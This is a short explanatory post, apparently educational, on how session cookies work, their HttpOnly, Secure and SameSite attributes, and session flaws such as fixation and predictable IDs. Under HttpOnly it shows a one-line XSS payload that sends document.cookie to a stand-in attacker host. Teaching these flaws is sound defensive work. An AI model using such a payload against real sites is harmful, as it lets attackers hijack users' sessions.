Cookies & Sessions

How do Sessions work?

1-Log in → The server verifies your information

2-The server creates a unique Session ID and stores it in its memory.

3-It will be sent to you via your browserSet-Cookie

4-Each time you request something, you send this cookie, and the server recognizes you from it without you having to log in again.

Important security characteristics of cookies:

HttpOnly— Prevents JavaScript from reading the cookie. If this feature is missing and there is XSS on the site, an attacker can steal the cookie with a single line of code:

document.location='http://attacker.com/steal?c='+document.cookie

SecureCookies are only sent via HTTPS. If they are lost, they can be stolen via a MITM attack on a public Wi-Fi network.

If the Secure attribute is missing, the browser may send the cookie over an HTTP connection. An attacker on the same public Wi-Fi network could intercept the unencrypted traffic using a Man-in-the-Middle (MITM) attack and steal the session cookie.

SameSite— Control whether the cookie is sent with requests from other websites (protects against CSRF):

-StrictNever send cross-site requests

-Lax= It is only sent in certain cases (e.g., when shared via links)

-NoneIt always sends (danger if it doesn't have Secure with it)

Common problems that can be detected through testing:

Session Fixation : If the site does not change the Session ID after logging in, you can give the victim a link with a ready-made Session ID, and then when they log in, you will be connected to the same session.

Predictable Session IDs : If the ID increases by one number (1001, 1002, 1003) or is based on weak encryption, you can guess it.

Session not ending : If the session does not end after logging out or after a long period of inactivity.
